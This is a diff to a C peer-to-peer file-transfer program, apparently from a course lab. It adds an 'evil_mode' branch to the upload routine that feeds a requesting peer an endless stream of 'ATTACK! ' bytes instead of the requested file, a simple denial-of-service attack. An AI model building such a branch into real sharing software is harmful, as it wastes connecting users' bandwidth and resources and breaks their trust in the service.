@@ -689,6 +689,9 @@ static void task_upload(task_t *t)
 
 	message("* Transferring file %s\n", t->filename);
 	// Now, read file from disk and write it to the requesting peer.
+  
+     if(!evil_mode) {        
+
 	while (1) {
 		int ret = write_from_taskbuf(t->peer_fd, t);
 		if (ret == TBUF_ERROR) {
@@ -704,6 +707,29 @@ static void task_upload(task_t *t)
 			/* End of file */
 			break;
 	}
+ 
+     }
+
+     if(evil_mode == 1) { //Send user an infinite stream of bytes
+         int evil_pipe[2];
+         pipe(evil_pipe);
+         char attack_str[] = "ATTACK! ";
+
+         //Keep writing bytes until client closes connection
+         while(1) {
+             write(evil_pipe[1],attack_str,sizeof(attack_str));
+             read_to_taskbuf(evil_pipe[0],t);
+             int success = write_from_taskbuf(t->peer_fd, t);
+             if( success == TBUF_ERROR || success == TBUF_END ) 
+                 break;
+         } 
+
+         close(evil_pipe[0]);
+         close(evil_pipe[1]); 
+         goto exit;
+     }
+      
+     
 
 	message("* Upload of %s complete\n", t->filename);
 
@@ -837,6 +863,7 @@ int main(int argc, char *argv[])
         }
 
         // Block main thread until all downloads have completed
+
         current_d = d_list;
         download_list_t *ptr;
        
@@ -848,6 +875,7 @@ int main(int argc, char *argv[])
             free(ptr);
         }
 
+        
 	// Then accept connections from other peers and upload files to them!
 
         //Generate a new thread for each upload request
